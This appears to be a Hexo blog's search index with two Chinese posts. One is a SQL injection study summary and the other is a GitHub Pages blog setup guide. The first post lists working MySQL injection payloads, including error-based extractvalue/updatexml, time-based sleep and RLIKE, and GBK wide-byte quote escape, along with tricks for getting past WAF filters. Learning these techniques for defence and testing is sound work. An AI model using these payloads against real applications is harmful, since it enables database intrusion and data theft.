<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>SQL注入总结</title>
    <url>/uncategorized/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="SQL注入总结"><a href="#SQL注入总结" class="headerlink" title="SQL注入总结"></a>SQL注入总结</h1><p>SQL注入是比较常见的漏洞，现在总结一下，也算是重新复习一下 </p>
<a id="more"></a>
<h1 id="1-SQL漏洞类型"><a href="#1-SQL漏洞类型" class="headerlink" title="1. SQL漏洞类型"></a>1. SQL漏洞类型</h1><h2 id="1-1-内联注入"><a href="#1-1-内联注入" class="headerlink" title="1.1 内联注入"></a>1.1 内联注入</h2><blockquote>
<p>对于内联注入，我的理解是扩展。利用and、or 和一些逻辑运算符进行的扩展。  </p>
</blockquote>
<p>正常的查询语句是这样的：<code>select * from test where id=1</code><br>内联注入的是：  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from test where id&#x3D;-1 or 1&#x3D;1  </span></pre></td></tr><tr><td class="code"><pre><span class="line">select user from test where id&#x3D;-1 or !0;  </span></pre></td></tr><tr><td class="code"><pre><span class="line">select user from test where id&#x3D;-1 or ~18446744073709551615;</span></pre></td></tr></table></figure>
<h2 id="1-2-报错注入"><a href="#1-2-报错注入" class="headerlink" title="1.2 报错注入"></a>1.2 报错注入</h2><blockquote>
<p>报错注入是人为的制造错误，以获得我们需要的信息<br>条件：可以看得到报错的信息  </p>
</blockquote>
<h3 id="1-2-1-报错的类型"><a href="#1-2-1-报错的类型" class="headerlink" title="1.2.1 报错的类型"></a>1.2.1 报错的类型</h3><ol>
<li>溢出报错  <blockquote>
<p>待补充  </p>
</blockquote>
</li>
<li>xpath语法报错  <blockquote>
<p>mysql提供了两个操作XML的函数。这两个函数的第一个参数都是XML文档字符串，第二个参数是xpath的语法，如果不满足就会返回非法格式的内容。这两种报错最多报错32字符<br>1.extractvalue(目标xml文档，xml路径)<br><code>select extractvalue(1,concat(0x7e,(select user()),0x7e));</code><br>2.updatexml(目标xml文档，xml路径，更新的内容)<br><code>select updatexml(1,concat(0x7e,(select user()),0x7e),1);</code>  </p>
</blockquote>
</li>
<li>主键重复  <blockquote>
<p>利用 floor() 、 group by 、 rand() 、count() 三个函数触发<br><code>select count(*) from test group by concat(version(),floor(rand(0)*2));</code><br>原理：floor(rand(0)*2)可以生成一个固定的0、1序列，group by在进行分组时，会因为主键重复报错。  </p>
</blockquote>
</li>
<li>几何函数报错  <blockquote>
<p>geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring()</p>
</blockquote>
</li>
</ol>
<h2 id="1-3-布尔注入"><a href="#1-3-布尔注入" class="headerlink" title="1.3 布尔注入"></a>1.3 布尔注入</h2><p>布尔注入是根据页面的正确显示与否来判断我们需要知道的信息。  </p>
<h2 id="1-4-时间注入"><a href="#1-4-时间注入" class="headerlink" title="1.4 时间注入"></a>1.4 时间注入</h2><p>时间注入是根据服务器响应时间判断我们需要的信息。  </p>
<h3 id="1-4-1-类型"><a href="#1-4-1-类型" class="headerlink" title="1.4.1 类型"></a>1.4.1 类型</h3><ol>
<li>if() 和 sleep（）</li>
<li>BENCHMARK(count,expr)，benchmark函数会重复计算expr表达式count次（消耗CPU）  </li>
<li>笛卡尔积<br>例如：<code>select * from test where id=1 and (select count(*) from information_schema.columns A,information_schema.tables B);</code>  </li>
<li>RLIKE注入<br>例如：<code>select * from flag where flag=&#39;1&#39; and if(mid(user(),1,1)=&#39;s&#39;,concat(rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;)) RLIKE &#39;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#39;,1);</code>  <h2 id="1-5-堆叠查询注入"><a href="#1-5-堆叠查询注入" class="headerlink" title="1.5 堆叠查询注入"></a>1.5 堆叠查询注入</h2>SQL语句是以分号；结束一个语句的，所以堆叠注入可以执行多条SQL语句。  <h2 id="1-6-二次注入"><a href="#1-6-二次注入" class="headerlink" title="1.6 二次注入"></a>1.6 二次注入</h2>二次注入是输入的数据经过处理后进入数据库中又恢复到了原来的数据，程序再从数据库中取出这些数据查询的时候就造成了注入。  <h2 id="1-7-宽字节注入"><a href="#1-7-宽字节注入" class="headerlink" title="1.7 宽字节注入"></a>1.7 宽字节注入</h2>SQL语句执行过程分析：<blockquote>
<ol>
<li>客户端以它的字符编码生成SQL语句发送到MySQL服务器。</li>
<li>服务器接收请求后，会先查询<strong>character_set_client</strong>的字符编码，并用这个字符编码进行解码。</li>
<li>查询<strong>character_set_connection</strong>的字符编码，将解码后的SQL语句用它再进行编码。</li>
<li>进行内部操作前，将请求按照如下规则转化成内部操作字符集  <blockquote>
<p>4.1 使用字段 CHARACTER SET 设定值；<br>4.2 若上述值不存在，使用对应数据表的DEFAULT CHARACTER SET设定值；<br>4.3 若上述值不存在，则使用对应数据库的DEFAULT CHARACTER SET设定值；<br>4.4 若上述值不存在，则使用character_set_server设定值。  </p>
</blockquote>
</li>
<li>执行完SQL语句后，将执行结果按照 character_set_results 编码进行输出。  </li>
</ol>
</blockquote>
</li>
</ol>
<h3 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h3><ol>
<li>GBK的编码范围是0x8140~0xFEFE（不包括xx7F）  </li>
<li>经过处理过后的转义字符中有\，\的编码是%5C</li>
<li>%df和%5c靠在一起被GBK解码后就是0xdf5c，完全满足他的编码范围，所以后面的引号就逃逸出来了。  </li>
</ol>
<p>其实也不一定是GBK编码，只要是满足那些编码的解码范围都是可以的。<br>可以用<code>show charset</code>查看MySQL支持的编码。  </p>
<h1 id="2-常见的函数"><a href="#2-常见的函数" class="headerlink" title="2. 常见的函数"></a>2. 常见的函数</h1><h2 id="2-1-字符串截取"><a href="#2-1-字符串截取" class="headerlink" title="2.1 字符串截取"></a>2.1 字符串截取</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">left(str,index)  &#x2F;&#x2F;从左边第index开始截取</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">right(str,index) &#x2F;&#x2F;从右边第index开始截取</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">substring(str,index,[len]) &#x2F;&#x2F;截取str,index开始,截取len的长度(可为负)</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">substr(str,index,[len]) &#x2F;&#x2F;截取str,index开始,截取len的长度(可为负)</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">mid(str,index,ken) &#x2F;&#x2F;截取str 从index开始,截取len的长度  </span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">substring_index(str ,delim ,count ) &#x2F;&#x2F;从str中寻找定界符delim并根据count计数（count为负时从后往前查找)</span></pre></td></tr></table></figure>
<h2 id="2-2-字符串比较"><a href="#2-2-字符串比较" class="headerlink" title="2.2 字符串比较"></a>2.2 字符串比较</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">strcmp(expr1,expr2) &#x2F;&#x2F;如果两个字符串是一样则返回0,如果第一个小于第二个则返回-1  </span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">find_in_set(str,strlist) &#x2F;&#x2F;strlist由逗号分隔（可选），返回strlist中与str匹配的位置。  </span></pre></td></tr><tr><td class="code"><pre><span class="line">find_in_set(str1,str2) &#x2F;&#x2F;如果相同则返回1不同则返回0  </span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">field(str1,str2,str3,...) &#x2F;&#x2F;返回第一个与str1匹配的位置。  </span></pre></td></tr><tr><td class="code"><pre><span class="line">field(str1,str2) &#x2F;&#x2F;如果相同返回1不同返回0</span></pre></td></tr></table></figure>
<h2 id="2-3-字符串连接"><a href="#2-3-字符串连接" class="headerlink" title="2.3 字符串连接"></a>2.3 字符串连接</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">concat(str1,str2) &#x2F;&#x2F;将字符串首尾相连</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">concat_ws(separator,str1,str2) &#x2F;&#x2F;将字符串用指定分隔符连接</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">group_concat()&#x2F;&#x2F;</span></pre></td></tr></table></figure>
<h2 id="2-4-字符串变换"><a href="#2-4-字符串变换" class="headerlink" title="2.4 字符串变换"></a>2.4 字符串变换</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">insert(str,x,y,instr) &#x2F;&#x2F;将字符串str从第x开始，y个字符串长度的子串替换为字符串instr</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">lpad(str,n,pad) &#x2F;&#x2F;使用字符串pad对字符串str最左边进行填充，直到长度为n个字符长度  </span></pre></td></tr><tr><td class="code"><pre><span class="line">rpad(str,n,pad) &#x2F;&#x2F;使用字符串pad对字符串str最右边进行填充，直到长度为n个字符长度  </span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">REPEAT(str,x) &#x2F;&#x2F;返回字符串str重复x次的结果</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">REPLACE(str,a,b) &#x2F;&#x2F;使用字符串b替换字符串str中所有出现的字符串a</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">REVERSE(str) &#x2F;&#x2F;返回字符串 str ，顺序和字符顺序相反</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">SPACE(N) &#x2F;&#x2F;返回一个由N 间隔符号组成的字符串</span></pre></td></tr></table></figure>
<h2 id="2-4-去空格"><a href="#2-4-去空格" class="headerlink" title="2.4 去空格"></a>2.4 去空格</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LTRIM(str) &#x2F;&#x2F;去掉str左边的空格</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">RTRIM(str) &#x2F;&#x2F;去掉str右边的空格</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">TRIM(str) &#x2F;&#x2F;去掉字符串行头和行尾的空格</span></pre></td></tr></table></figure>
<h2 id="2-5-获取字符串长度"><a href="#2-5-获取字符串长度" class="headerlink" title="2.5 获取字符串长度"></a>2.5 获取字符串长度</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">length(str) &#x2F;&#x2F;	获取str的字符串长度</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">OCTET_LENGTH(str) &#x2F;&#x2F;上同</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">char_length(str) &#x2F;&#x2F;获取str的字符数 </span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">CHARACTER_LENGTH(str) &#x2F;&#x2F;上同 </span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">字符串长度是需要看字符编码的，而字符数就是你的字符个数</span></pre></td></tr></table></figure>
<h2 id="2-6-进制转换"><a href="#2-6-进制转换" class="headerlink" title="2.6 进制转换"></a>2.6 进制转换</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ascii(str) &#x2F;&#x2F;返回值为字符串 str 的最左字符的数值。0~255</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">bin(num) &#x2F;&#x2F;返回值为 Num 的二进制值的字符串表示</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">CHAR(N ,… ,[USING charset ]) &#x2F;&#x2F;返回值为一个包含这些整数的代码值所给出的字符的字符串 </span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">HEX( N or S ) &#x2F;&#x2F;如果 N OR S 是一个数字，则返回一个十六进制值 N 的字符串表示。如果N OR S 是一个字符串，则返回值为一个N OR S 的十六进制字符串表示，其中每个N OR S 里的每个字符被转化为两个十六进制数字。</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">OCT(N) &#x2F;&#x2F;返回一个 N 的八进制值的字符串表示</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">ORD(str) &#x2F;&#x2F;ORD() 函数返回字符串第一个字符的 ASCII 值</span></pre></td></tr></table></figure>

<h1 id="3-一些绕过方法"><a href="#3-一些绕过方法" class="headerlink" title="3. 一些绕过方法"></a>3. 一些绕过方法</h1><h2 id="3-1-条件语句"><a href="#3-1-条件语句" class="headerlink" title="3.1 条件语句"></a>3.1 条件语句</h2><p>可能需要用到的运算符</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">逻辑运算符  </span></pre></td></tr><tr><td class="code"><pre><span class="line">not或! 非  </span></pre></td></tr><tr><td class="code"><pre><span class="line">AND 逻辑与 &#x3D;&#x3D; &amp;&amp;</span></pre></td></tr><tr><td class="code"><pre><span class="line">OR 逻辑或 &#x3D;&#x3D; ||</span></pre></td></tr><tr><td class="code"><pre><span class="line">XOR 逻辑异或 &#x3D;&#x3D; ^</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">位运算符  </span></pre></td></tr><tr><td class="code"><pre><span class="line">&amp; 按位与</span></pre></td></tr><tr><td class="code"><pre><span class="line">| 按位或</span></pre></td></tr><tr><td class="code"><pre><span class="line">^ 按位异或</span></pre></td></tr><tr><td class="code"><pre><span class="line">! 取反</span></pre></td></tr><tr><td class="code"><pre><span class="line">&lt;&lt; 左移</span></pre></td></tr><tr><td class="code"><pre><span class="line">&gt;&gt;右移</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">注释符  </span></pre></td></tr><tr><td class="code"><pre><span class="line"># &#x2F;&#x2F;单行注释符,url记得编码为%23</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#x2F;**&#x2F; </span></pre></td></tr><tr><td class="code"><pre><span class="line">--+</span></pre></td></tr></table></figure>
<blockquote>
<p>if(expr1,expr2,expr3) //expr1 true执行expr2否则执行expr3<br>select case when (条件) then 代码1 else 代码2 end</p>
</blockquote>
<h2 id="3-2-空白字符"><a href="#3-2-空白字符" class="headerlink" title="3.2 空白字符"></a>3.2 空白字符</h2><blockquote>
<p>在空格被过滤的情况下，可以用一下字符代替<br>%20 %09 %0a %0b %0c %0d %a0 /<em>*/ tab<br>%a0 这个不会被php的\s进行匹配<br>/</em>!*/ 内敛注释,语句可以被执行</p>
</blockquote>
<h2 id="3-3-过滤-号"><a href="#3-3-过滤-号" class="headerlink" title="3.3 过滤=号"></a>3.3 过滤=号</h2><ol>
<li>函数绕过:<br> strcmp(),locate(s1,s) , position(s1 in s) , instr(s,s1),greatest(),find_in_set()</li>
<li>&lt; &gt; &lt;&gt;</li>
<li>like regexp rlike between…and…</li>
<li>in //select “123” in (“123”); =&gt; 1 select “123” in (“12”) =&gt;0</li>
</ol>
<h2 id="3-4-过滤字段名"><a href="#3-4-过滤字段名" class="headerlink" title="3.4 过滤字段名"></a>3.4 过滤字段名</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select e.3 from (select * from (select 1)b,(select 2)c,(select 3)a union select * from test)e;</span></pre></td></tr><tr><td class="code"><pre><span class="line">通过构造一个虚拟表</span></pre></td></tr><tr><td class="code"><pre><span class="line"> select * from (select 1)... union select * from test, 联合进表信息 赋予别名 然后通过列数来调用</span></pre></td></tr></table></figure>

<h2 id="3-5-过滤逗号"><a href="#3-5-过滤逗号" class="headerlink" title="3.5 过滤逗号"></a>3.5 过滤逗号</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">limit 0,1 &#x3D;&gt; limit 1 offset 0;</span></pre></td></tr><tr><td class="code"><pre><span class="line">mid(str,5,1) &#x3D;&gt;mid(&#39;str&#39;from 5 for 1) &#x3D;&gt;substr(&#39;str&#39; from for 1);</span></pre></td></tr><tr><td class="code"><pre><span class="line">union select 1,2,3 &#x3D;&gt; union select * from (select 1)a join (select 2)b join (select 3)c;</span></pre></td></tr></table></figure>

<h2 id="3-6-union-select-匹配绕过"><a href="#3-6-union-select-匹配绕过" class="headerlink" title="3.6 /union select/ 匹配绕过"></a>3.6 /union select/ 匹配绕过</h2><p><code>union distinct select 1,2,3</code></p>
<h2 id="3-7-传递一些敏感字符或者字段-或者-过滤了单引号传递字符串的时候"><a href="#3-7-传递一些敏感字符或者字段-或者-过滤了单引号传递字符串的时候" class="headerlink" title="3.7 传递一些敏感字符或者字段 或者 过滤了单引号传递字符串的时候"></a>3.7 传递一些敏感字符或者字段 或者 过滤了单引号传递字符串的时候</h2><p>可以将内容进行十六进制编码后传递</p>
<h1 id="等待后续更新哦"><a href="#等待后续更新哦" class="headerlink" title="等待后续更新哦"></a>等待后续更新哦</h1>]]></content>
      <tags>
        <tag>SQL注入</tag>
        <tag>漏洞学习</tag>
      </tags>
  </entry>
  <entry>
    <title>github+hexo搭建</title>
    <url>/uncategorized/github-hexo%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<h1 id="github-hexo搭建博客"><a href="#github-hexo搭建博客" class="headerlink" title="github+hexo搭建博客"></a>github+hexo搭建博客</h1><h5 id="因为网上都有很多教程-所以我也就纪录一下我安装的过程和问题啊"><a href="#因为网上都有很多教程-所以我也就纪录一下我安装的过程和问题啊" class="headerlink" title="因为网上都有很多教程,所以我也就纪录一下我安装的过程和问题啊"></a>因为网上都有很多教程,所以我也就纪录一下我安装的过程和问题啊</h5><h5 id="推荐使用Git-bash"><a href="#推荐使用Git-bash" class="headerlink" title="推荐使用Git bash"></a>推荐使用Git bash</h5><h1 id="github配置个人仓库"><a href="#github配置个人仓库" class="headerlink" title="github配置个人仓库"></a>github配置个人仓库</h1><a id="more"></a>
<p>1.New repository创建新仓库<br>2.仓库命名 用户名.gitHub.io</p>
<h1 id="配置SSH-KEY"><a href="#配置SSH-KEY" class="headerlink" title="配置SSH KEY"></a>配置SSH KEY</h1><p>ssh-keygen -t rsa -C “github注册邮箱”<br>git config –global user.name “你的GitHub用户名”<br>git config –global user.email “你的GitHub注册邮箱”<br>cd ~/.ssh<br>打开id_rsa.pub，复制里面的内容<br>登录进入GitHub页面，在设置里点击SSH and GPG keys，New ssh key 后将复制的密钥粘贴<br>在Git bash里检查公钥是否设置成功，ssh <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a></p>
<h1 id="设置GitHub密钥原因"><a href="#设置GitHub密钥原因" class="headerlink" title="设置GitHub密钥原因"></a>设置GitHub密钥原因</h1><p>github通过非对称加密的公钥与私钥来完成加密，公钥放置在GitHub上，私钥放置在自己的电脑里。GitHub要求每次推送代码都是合法用户，所以每次推送都需要输入账号密码验证推送用户是否是合法用户，为了省去每次输入密码的步骤，采用了ssh，当你推送的时候，git就会匹配你的私钥跟GitHub上面的公钥是否是配对的，若是匹配就认为你是合法用户，则允许推送。这样可以保证每次的推送都是正确合法的。</p>
<h1 id="安装Node-js和hexo"><a href="#安装Node-js和hexo" class="headerlink" title="安装Node.js和hexo"></a>安装Node.js和hexo</h1><p>Hexo基于Node.js,下载地址：<a href="https://nodejs.org/en/download/" target="_blank" rel="noopener">Download | Node.js</a><br>安装Node.js会包含环境变量及npm的安装，安装后，检测Node.js是否安装成功，在命令行中输入 node -v 和npm -v<br>npm install -g hexo-cli,然后选择一个你喜欢的文件夹，hexo init<br>hexo g 生成测试页面,  hexo s 启动服务预览</p>
<h1 id="网站绑定"><a href="#网站绑定" class="headerlink" title="网站绑定"></a>网站绑定</h1><p>打开_config.yml文件,找到类似下面的地方照着填一下就可以   </p>
<pre><code>deploy:
  type: git
  repository: git@github.com:S0-h4rd/S0-h4rd.github.io.git
  branch: master</code></pre><p>npm install hexo-deployer-git –save<br>hexo clean<br>hexo g<br>hexo d</p>
<h1 id="绑定域名"><a href="#绑定域名" class="headerlink" title="绑定域名"></a>绑定域名</h1><p>域名申请好之后就是域名解析<br>1.创建一个A记录到你的网站IP，这是将你的域名绑定到这个IP上，IP可以ping查一下类似这样的地址  </p>
<blockquote>
<p>S0-h4rd.github.io   </p>
</blockquote>
<p>2.再创建一个CNAME别名记录，记录值是类似这样的</p>
<blockquote>
<p>S0-h4rd.github.io  </p>
</blockquote>
<p>3.登录GitHub主页，进入你创建的网站的仓库，点击setting，找到Custom domain的框，填入你申请的域名</p>
<p>4.在本机里进入网站的source目录中，创建一个CNAME的文件，填入你申请的域名  </p>
<blockquote>
<p>然后就是三步走了<br>hexo clear<br>hexo g<br>hexo d 如果你想要看一下效果的话呢可以先hexo s在本地看一下效果再提交</p>
</blockquote>
<h2 id="大功告成，接下来就可以访问了"><a href="#大功告成，接下来就可以访问了" class="headerlink" title="大功告成，接下来就可以访问了"></a>大功告成，接下来就可以访问了</h2>]]></content>
      <tags>
        <tag>环境搭建</tag>
      </tags>
  </entry>
</search>
